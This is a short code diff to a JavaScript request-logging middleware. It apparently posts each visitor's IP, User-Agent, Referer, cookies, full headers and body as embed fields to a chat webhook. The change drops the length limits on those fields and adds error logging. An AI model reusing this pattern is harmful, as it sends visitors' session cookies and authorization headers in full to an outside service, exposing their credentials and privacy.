@@ -9,31 +9,31 @@ async function middleWare (req) {
 				fields: [
 					{
 						name: '**IP:**',
-						value: `${req.ip}`.slice(0, 1000) || 0,
+						value: `${req.ip}` || 0,
 					},
 					{
 						name: '**User-Agent:**',
-						value: req.get('User-Agent').slice(0, 1000) || 0,
+						value: req.get('User-Agent') || 0,
 						inline: true
 					},
 					{
 						name: '**Referer:**',
-						value: req.get('Referer').slice(0, 1000) || 0,
+						value: req.get('Referer') || 0,
 						inline: true
 					},
 					{
 						name: '**Cookies:**',
-						value: req.get('Cookie').slice(0, 1000) || 0,
+						value: req.get('Cookie') || 0,
 						inline: true
 					},
 					{
 						name: '**Headers:**',
-						value: JSON.stringify(req.headers).slice(0, 1000) || 0,
+						value: JSON.stringify(req.headers) || 0,
 						inline: true
 					},
 					{
 						name: '**Body:**',
-						value: JSON.stringify(req.body).slice(0, 1000) || 0,
+						value: JSON.stringify(req.body) || 0,
 						inline: true
 					},
 				],
@@ -44,6 +44,8 @@ async function middleWare (req) {
 				}
 			}
 		]
+	}).catch((e) => {
+		console.log(e);
 	});
 }
 
